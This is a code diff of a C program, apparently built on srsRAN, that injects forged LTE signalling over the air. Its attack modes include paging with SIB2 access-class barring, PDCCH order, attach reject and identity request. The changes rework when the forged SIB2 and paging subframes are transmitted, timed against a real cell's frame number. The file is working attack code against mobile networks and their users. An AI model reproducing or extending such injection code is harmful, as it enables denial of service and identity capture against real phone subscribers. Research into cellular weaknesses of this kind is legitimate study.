@@ -76,9 +76,6 @@ char buffer[PATH_MAX];  // 使用系统标准路径长度
  bool ar_msg = false;
  bool ir_msg = false;
 
- int sib2_period = 16;
- int sib1_period = 2;
-
  static cell_search_cfg_t cell_detect_config = {.max_frames_pbch      = SRSRAN_DEFAULT_MAX_FRAMES_PBCH,
                                          .max_frames_pss       = SRSRAN_DEFAULT_MAX_FRAMES_PSS,
                                          .nof_valid_pss_frames = SRSRAN_DEFAULT_NOF_VALID_PSS_FRAMES,
@@ -93,14 +90,10 @@ char buffer[PATH_MAX];  // 使用系统标准路径长度
  static cf_t* po_buffer[SRSRAN_MAX_PORTS] = {NULL};
  static cf_t* ar_buffer[SRSRAN_MAX_PORTS] = {NULL};
  static cf_t* ir_buffer[SRSRAN_MAX_PORTS] = {NULL};
- static cf_t* sib2else_buffer[SRSRAN_MAX_PORTS] = {NULL};
-
  static char* paging_file_name;
  //static char* mib_file_name;
  static char* sib1_file_name;
  static char* sib2_file_name;
- static char* sib2else_file_name;
-
  static char* attachreject_file_name;
  static char* identityrequest_file_name;
  static char* pdcchorder_file_name;
@@ -188,7 +181,7 @@ char buffer[PATH_MAX];  // 使用系统标准路径长度
  static srsran_cfr_cfg_t        cfr_config                  = {};
  
  static cf_t *   sf_buffer[SRSRAN_MAX_PORTS] = {NULL}, *output_buffer[SRSRAN_MAX_PORTS] = {NULL};
- static uint32_t sf_n_re, sf_n_samples, else_sf_n_samples;
+ static uint32_t sf_n_re, sf_n_samples;
  
  static pthread_t          net_thread;
  static void*              net_thread_fnc(void* arg);
@@ -362,8 +355,7 @@ char buffer[PATH_MAX];  // 使用系统标准路径长度
                     sib2_msg = true;
                     paging_msg = true;
                     paging_file_name = "paging_sysinfmod_sf9.fc32";
-                    sib2_file_name = "sib2_acbarring_sf1.fc32";
-                    sib2else_file_name = "sib2_acbarring_else.fc32";
+                    sib2_file_name = "sib2_acbarring_sf0.fc32";
                 }
                 else if (strcmp(attack_mode, "pdcch_order") == 0) {
                     po_msg = true;
@@ -486,13 +478,6 @@ char buffer[PATH_MAX];  // 使用系统标准路径长度
        exit(-1);
      }
      srsran_vec_cf_zero(sib2_buffer[i], sf_n_samples);
-
-    sib2else_buffer[i] = srsran_vec_cf_malloc(else_sf_n_samples);
-     if (!sib2else_buffer[i]) {
-       perror("malloc");
-       exit(-1);
-     }
-     srsran_vec_cf_zero(sib2else_buffer[i], else_sf_n_samples);
 
      po_buffer[i] = srsran_vec_cf_malloc(sf_n_samples);
      if (!po_buffer[i]) {
@@ -690,9 +675,6 @@ char buffer[PATH_MAX];  // 使用系统标准路径长度
        free(sib1_buffer[i]);
      }
      if (sib2_buffer[i]) {
-       free(sib2_buffer[i]);
-     }
-     if (sib2else_buffer[i]) {
        free(sib2_buffer[i]);
      }
      if (po_buffer[i]) {
@@ -1157,7 +1139,6 @@ char buffer[PATH_MAX];  // 使用系统标准路径长度
        next_sfn = (cur_sfn + 1) % 1024; 
        int ret = -1;
        if (sib1_msg && paging_msg) {
-        if (next_sfn % sib1_period == 0 || true) {
           target_tti = 5;
           memcpy(&future_time, &cur_time, sizeof(srsran_timestamp_t));
           time_offset = (10 + target_tti - cur_sf_idx) * 0.001 - 0.0001;
@@ -1180,46 +1161,29 @@ char buffer[PATH_MAX];  // 使用系统标准路径长度
             exit(-1);
           }
           target_sfn = (target_sfn + 1) % 1024;
-        }
        } else if (sib2_msg && paging_msg) {
-        if (next_sfn % sib2_period == 0) {
-        //if (next_sfn % sib2_period == 0 || true) {
-
-          /*target_tti = 0;
-          memcpy(&future_time, &cur_time, sizeof(srsran_timestamp_t));
-          float last_time = (30720 - 3072 - else_sf_n_samples)/30720 * 0.001 ;
-          time_offset = (10 + target_tti - cur_sf_idx) * 0.001 + last_time;
-          srsran_timestamp_add(&future_time, 0, time_offset - (66.0 / 30720000.0));
-          printf("%s [Subframe %d] [future_time] next_sfn: %d %.f: %f s\n", attack_mode, target_tti, next_sfn, difftime(future_time.full_secs, (time_t) 0), future_time.frac_secs);
-          ret = srsran_rf_send_timed_multi(&radio, (void**) sib2else_buffer, else_sf_n_samples, future_time.full_secs, future_time.frac_secs, true, start_of_burst, end_of_burst);
-          if (ret != else_sf_n_samples) {-
-            printf("[!] Warning!!!!!!!!!: txd sample is not sf_n_samples!!!!!\n");
-            exit(-1);
-          }*/
-          target_tti = 1;
-          memcpy(&future_time, &cur_time, sizeof(srsran_timestamp_t));
-          time_offset = (10 + target_tti - cur_sf_idx) * 0.001 - 0.0001;
-          srsran_timestamp_add(&future_time, 0, time_offset - (66.0 / 30720000.0));
-          printf("%s [Subframe %d] [future_time] next_sfn: %d %.f: %f s\n", attack_mode, target_tti, next_sfn, difftime(future_time.full_secs, (time_t) 0), future_time.frac_secs);
-          ret = srsran_rf_send_timed_multi(&radio, (void**) sib2_buffer, sf_n_samples, future_time.full_secs, future_time.frac_secs, true, start_of_burst, end_of_burst);
-          if (ret != sf_n_samples) {
-            printf("[!] Warning!!!!!!!!!: txd sample is not sf_n_samples!!!!!\n");
-            exit(-1);
-          }
+        target_tti = 0;
+        memcpy(&future_time, &cur_time, sizeof(srsran_timestamp_t));
+        time_offset = (10 + target_tti - cur_sf_idx) * 0.001 - 0.0001;
+        srsran_timestamp_add(&future_time, 0, time_offset - (66.0 / 30720000.0));
+        printf("%s [Subframe 0] [future_time] next_sfn: %d %.f: %f s\n", attack_mode, next_sfn, difftime(future_time.full_secs, (time_t) 0), future_time.frac_secs);
+        ret = srsran_rf_send_timed_multi(&radio, (void**) sib2_buffer, sf_n_samples, future_time.full_secs, future_time.frac_secs, true, start_of_burst, end_of_burst);
+        if (ret != sf_n_samples) {
+          printf("[!] Warning!!!!!!!!!: txd sample is not sf_n_samples!!!!!\n");
+          exit(-1);
         }
-          target_tti = 9;
-          memcpy(&future_time, &cur_time, sizeof(srsran_timestamp_t));
-          time_offset = (10 + target_tti - cur_sf_idx) * 0.001 - 0.0001;
-          srsran_timestamp_add(&future_time, 0, time_offset - (66.0 / 30720000.0));
-          printf("%s [Subframe %d] [future_time] next_sfn: %d %.f: %f s\n", attack_mode, target_tti, next_sfn, difftime(future_time.full_secs, (time_t) 0), future_time.frac_secs);
-          ret = srsran_rf_send_timed_multi(&radio, (void**) paging_buffer, sf_n_samples, future_time.full_secs, future_time.frac_secs, true, start_of_burst, end_of_burst);
-          if (ret != sf_n_samples) {
-            printf("[!] Warning!!!!!!!!!: txd sample is not sf_n_samples!!!!!\n");
-            exit(-1);
-          }
-          target_sfn = (target_sfn + 1) % 1024;
-          printf("\n");
-    
+
+        target_tti = 9;
+        memcpy(&future_time, &cur_time, sizeof(srsran_timestamp_t));
+        time_offset = (10 + target_tti - cur_sf_idx) * 0.001 - 0.0001;
+        srsran_timestamp_add(&future_time, 0, time_offset - (66.0 / 30720000.0));
+        printf("%s [Subframe 9] [future_time] next_sfn: %d %.f: %f s\n", attack_mode, next_sfn, difftime(future_time.full_secs, (time_t) 0), future_time.frac_secs);
+        ret = srsran_rf_send_timed_multi(&radio, (void**) paging_buffer, sf_n_samples, future_time.full_secs, future_time.frac_secs, true, start_of_burst, end_of_burst);
+        if (ret != sf_n_samples) {
+          printf("[!] Warning!!!!!!!!!: txd sample is not sf_n_samples!!!!!\n");
+          exit(-1);
+        }
+        target_sfn = (target_sfn + 1) % 1024;
       } else if(paging_msg) {
         target_tti = 9;
         memcpy(&future_time, &cur_time, sizeof(srsran_timestamp_t));
@@ -1261,7 +1225,7 @@ char buffer[PATH_MAX];  // 使用系统标准路径长度
        buffers[p] = sf_buffer_sync[p];
      }
      ret = srsran_ue_sync_zerocopy(&ue_sync, buffers, max_num_samples);
-     //printf("test yg ret:%d, sfn:%d, sf_idx:%d\n", ret, &ue_sync.sf_idx);
+     
      if (ret != 1) {
        rx_ret = -1;
        sfn = -100;
@@ -1276,7 +1240,6 @@ char buffer[PATH_MAX];  // 使用系统标准路径长度
  
        sf_idx = srsran_ue_sync_get_sfidx(&ue_sync);
        if (sf_idx == 0) {
-        //printf("test yg before decode sfn:%d\n", sfn);
          n = srsran_ue_mib_decode(&ue_mib, bch_payload, NULL, &sfn_offset);
          if (n < 0) {
            ERROR("Error decoding UE MIB");
@@ -1287,10 +1250,7 @@ char buffer[PATH_MAX];  // 使用系统标准路径长度
          } else if (n == SRSRAN_UE_MIB_FOUND) {
            srsran_pbch_mib_unpack(bch_payload, &cell, &sfn);
            sfn = (sfn + sfn_offset) % 1024;
-           //printf("test yg after decode sfn:%d\n\n", sfn);
-
          }
-
        }
        updated = true;
        pthread_cond_signal(&cond);
@@ -1575,7 +1535,6 @@ int main(int argc, char** argv)
    N_id_2       = cell.id % 3;
    sf_n_re      = SRSRAN_SF_LEN_RE(cell.nof_prb, cell.cp);
    sf_n_samples = 1.2 * 2 * SRSRAN_SLOT_LEN(srsran_symbol_sz(cell.nof_prb));
-   else_sf_n_samples = 18432;
    cell.phich_length    = SRSRAN_PHICH_NORM;
    cell.phich_resources = SRSRAN_PHICH_R_1;
    sfn                  = 0;
@@ -1697,8 +1656,6 @@ int main(int argc, char** argv)
      if (sib2_msg) {
        printf ("Ready SIB2 Case!\n");
        read_file(sib2_buffer[0], sib2_file_name);
-
-       read_file(sib2else_buffer[0], sib2else_file_name);
      }
      if (po_msg) {
       printf ("Ready Pdcch Order Case!\n");
